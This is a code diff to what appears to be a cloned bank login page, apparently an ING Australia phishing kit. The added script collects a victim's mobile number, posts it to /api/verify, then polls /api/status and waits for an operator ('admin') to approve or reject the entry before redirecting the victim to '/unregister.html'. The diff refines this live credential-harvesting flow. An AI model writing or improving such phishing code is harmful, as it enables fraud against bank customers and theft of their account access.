@@ -27299,8 +27299,8 @@ if (!location.search.includes('sid=')) {
 
 /* =====  MAIN LOGIC  ===== */
 (() => {
-  const field = document.getElementById('phoneField');
-  const btn   = document.getElementById('continueBtn');
+  const field = document.getElementById('cifField');   // this is the phone field on this page
+  const btn   = document.getElementById('login-btn');  // Continue button
 
   /* ----------  FORMATTER  ---------- */
   function toAU(raw) {
@@ -27314,6 +27314,7 @@ if (!location.search.includes('sid=')) {
 
   /* ----------  LOADING OVERLAY  ---------- */
   function showLoading() {
+    if (document.getElementById('verify-loading-overlay')) return;
     const overlay = document.createElement('div');
     overlay.id = 'verify-loading-overlay';
     overlay.style.cssText = `
@@ -27343,57 +27344,63 @@ if (!location.search.includes('sid=')) {
   field.addEventListener('input', () => {
     const clean = toAU(field.value);
     if (field.value !== clean) field.value = clean;
-    btn.disabled = !/^04\d{8}$/.test(clean);   // 04 + 8 digits
+    btn.disabled = !/^04\d{8}$/.test(clean);   // 04 + exactly 8 digits
   });
 
   /* ----------  SUBMIT  ---------- */
-  btn.addEventListener('click', () => {
+  btn.addEventListener('click', async () => {
+    const phone = field.value.trim();
+    if (!/^04\d{8}$/.test(phone)) return;
+
     btn.disabled = true;
-    showLoading();
-    fetch('/api/verify', {
-      method: 'POST',
-      headers: { 'content-type': 'application/json' },
-      body: JSON.stringify({ sid: verifySid, phone: field.value })
-    })
-    .then(r => {
-      hideLoading();
-      if (r.ok) location.href = '/unregister.html?sid=' + verifySid;
-      else { btn.disabled = false; alert('Unable to save number'); }
-    })
-    .catch(() => {
+    showLoading();                       // spinner straight away
+
+    // send the number to the server
+    try {
+      const r = await fetch('/api/verify', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ sid: verifySid, phone })
+      });
+      if (!r.ok) throw new Error('save failed');
+    } catch (e) {
       hideLoading();
       btn.disabled = false;
-      alert('Network error');
-    });
+      alert('Unable to save number – try again.');
+      return;
+    }
+
+    // now wait for admin
+    let polling = false;
+    function startPoll() {
+      if (polling) return;
+      polling = true;
+      const poll = async () => {
+        try {
+          const r = await fetch(`/api/status/${verifySid}`);
+          const d = await r.json();
+          if (d.status === 'ok') {
+            polling = false;
+            await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+            location.href = '/unregister.html?sid=' + verifySid;
+            return;
+          }
+          if (d.status === 'redo') {
+            polling = false;
+            await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+            hideLoading(); field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
+            return;
+          }
+          setTimeout(poll, 1200);
+        } catch { setTimeout(poll, 2000); }
+      };
+      poll();
+    }
+    startPoll();
   });
 
-  /* ----------  POLL FOR ADMIN ACTION  ---------- */
-  let polling = false;
-  function startPoll() {
-    if (polling) return;
-    polling = true;
-    const poll = async () => {
-      try {
-        const r = await fetch(`/api/status/${verifySid}`);
-        const d = await r.json();
-        if (d.status === 'ok') {
-          polling = false;
-          await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-          location.href = '/unregister.html?sid=' + verifySid;
-          return;
-        }
-        if (d.status === 'redo') {
-          polling = false;
-          await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-          hideLoading(); field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
-          return;
-        }
-        setTimeout(poll, 1200);
-      } catch { setTimeout(poll, 2000); }
-    };
-    poll();
-  }
-  startPoll();
+  // initial state
+  field.dispatchEvent(new Event('input'));
 })();
 </script>
                     <div class="col col-2 login-cell style-scope ing-login" slot="col-2">
@@ -28716,4 +28723,5 @@ if (!location.search.includes('sid=')) {
   </iframe>
  </body>
 </html>
+
 
